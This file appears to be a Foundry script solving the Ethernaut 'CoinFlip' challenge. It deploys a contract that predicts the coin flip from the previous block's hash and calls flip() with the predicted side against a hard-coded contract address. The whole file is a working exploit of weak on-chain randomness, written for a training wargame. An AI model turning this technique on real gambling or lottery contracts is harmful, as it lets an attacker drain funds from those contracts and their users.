//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract Player {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor(CoinFlip _coinFlipInstance) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    _coinFlipInstance.flip(side);
    console.log("Wins: ",_coinFlipInstance.consecutiveWins());
  }
}



contract CoinFlipSolution is Script {

  CoinFlip  coinFlipInstance = CoinFlip(0x3378330Ab4C0795CdD7D7C719437e16b7b154EeA);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    new Player(coinFlipInstance);
    vm.stopBroadcast();
  } 

}